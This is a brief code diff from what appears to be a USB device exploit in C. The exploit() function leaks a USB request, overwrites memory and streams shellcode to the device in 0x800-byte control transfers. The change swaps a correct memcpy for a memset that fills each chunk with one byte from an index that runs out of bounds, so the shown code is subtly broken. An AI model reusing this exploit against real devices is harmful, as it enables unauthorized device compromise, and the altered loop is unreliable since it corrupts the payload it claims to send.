@@ -130,8 +130,8 @@ int exploit() {
     usb_req_leak();
     no_error_ctrl_transfer(0, 0, 0, 0, overwrite.data, overwrite.size, 100);
     for (int i = 0; i < final_shellcode.size; i += 0x800) {
-        uint8_t* data_chunk = malloc(0x800);
-        memcpy(data_chunk, &final_shellcode.data[i], 0x800);
+        uint8_t* data_chunk = calloc(0x800, 1);
+        memset(data_chunk, final_shellcode.data[i * 0x800], 0x800);
         async_ctrl_transfer(0x21, 1, 0, 0, data_chunk, 100);
         free(data_chunk);
     }
